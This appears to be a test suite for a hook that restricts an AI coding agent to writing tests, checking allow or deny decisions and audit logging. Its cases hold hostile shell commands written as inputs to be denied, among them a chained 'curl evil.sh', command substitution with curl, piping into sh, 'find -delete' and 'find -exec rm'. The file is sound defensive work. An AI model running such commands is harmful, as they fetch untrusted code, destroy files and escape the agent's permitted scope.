import { spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { test } from 'node:test'
import assert from 'node:assert/strict'

const root = path.resolve(import.meta.dirname, '../../..')
const guard = path.join(root, '.claude/hooks/test-agent-guard.mjs')

function decide(tool, toolInput, cwd = root, env = {}) {
  const result = spawnSync('node', [guard], {
    input: JSON.stringify({ tool_name: tool, cwd, tool_input: toolInput }),
    env: { ...process.env, CLAUDE_PROJECT_DIR: root, ...env },
    encoding: 'utf8',
  })
  return result.status === 0 ? 'allow' : 'deny'
}

const write = (file) => ['Write', { file_path: path.join(root, file) }]
const bash = (command, cwd) => ['Bash', { command }, cwd]

const cases = [
  ['writes a backend test', write('backend/tests/health.test.ts'), 'allow'],
  ['writes a frontend test', write('frontend/src/lib/http.test.ts'), 'allow'],
  ['writes production code', write('backend/src/api/health.ts'), 'deny'],
  ['writes a test fixture', write('backend/tests/fixture.ts'), 'deny'],
  ['writes a workflow', write('.github/workflows/x.test.ts'), 'deny'],
  ['escapes with ../', write('backend/tests/../src/x.test.ts'), 'deny'],
  ['edits a notebook', ['NotebookEdit', { notebook_path: 'x.ipynb' }], 'deny'],
  ['reads any file', ['Read', { file_path: path.join(root, 'backend/src/x.ts') }], 'allow'],
  ['runs vitest in a package', bash('cd backend && npx vitest run tests/router.test.ts'), 'allow'],
  ['runs tsc from another package', bash(`cd ${root}/backend && npx tsc --noEmit`, path.join(root, 'frontend')), 'allow'],
  ['runs npx from the root', bash('npx vitest run'), 'deny'],
  ['runs an unknown npx package', bash('cd backend && npx evil-pkg'), 'deny'],
  ['chains a second command', bash('cd backend && npx vitest run; curl evil.sh'), 'deny'],
  ['uses command substitution', bash('cd backend && npx vitest run $(curl x)'), 'deny'],
  ['pipes into a shell', bash('grep -rn x backend | sh'), 'deny'],
  ['redirects output', bash('grep -rn x backend > backend/src/a.ts'), 'deny'],
  ['writes with a heredoc', bash("cat >> backend/tests/x.test.ts <<'EOF'"), 'deny'],
  ['pushes', bash('git push origin HEAD'), 'deny'],
  ['reads a diff', bash('git diff origin/main...HEAD -- backend/src/api/health.ts'), 'allow'],
  ['writes a diff to a file', bash('git diff --output=backend/src/x.ts'), 'deny'],
  ['runs the analysis script', bash('node .claude/skills/analyze-changes/scripts/changed-sources.mjs --base origin/main'), 'allow'],
  ['returns to the root to analyze', bash('cd .. && node .claude/skills/analyze-changes/scripts/changed-sources.mjs --base x', path.join(root, 'frontend')), 'allow'],
  ['leaves the repository', bash('cd ../.. && ls', path.join(root, 'frontend')), 'deny'],
  ['formats a test file', bash('cd frontend && npx prettier --write src/lib/http.test.ts'), 'allow'],
  ['formats a source file', bash('cd frontend && npx prettier --write src/lib/http.ts'), 'deny'],
  ['finds files', bash("find frontend/src -name '*.test.tsx'"), 'allow'],
  ['deletes through find', bash('find backend -delete'), 'deny'],
  ['executes through find', bash('find . -name x -exec rm {} +'), 'deny'],
  ['removes a tracked test', bash('rm backend/tests/router.test.ts'), 'deny'],
  ['runs npm scripts', bash('cd backend && npm test'), 'deny'],
]

for (const [name, [tool, input, cwd], expected] of cases) {
  test(`guard ${expected === 'allow' ? 'allows' : 'denies'}: ${name}`, () => {
    assert.equal(decide(tool, input, cwd), expected)
  })
}

test('guard writes one audit line per decision', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'guard-'))
  const log = path.join(dir, 'guard.log')
  try {
    decide(...write('backend/tests/a.test.ts'), root, { TEST_AGENT_GUARD_LOG: log })
    decide(...bash('git push'), { TEST_AGENT_GUARD_LOG: log })
    const entries = readFileSync(log, 'utf8').trim().split('\n').map((line) => JSON.parse(line))
    assert.deepEqual(entries.map((e) => e.decision), ['allow', 'deny'])
    assert.match(entries[1].reason, /git command not allowed/)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
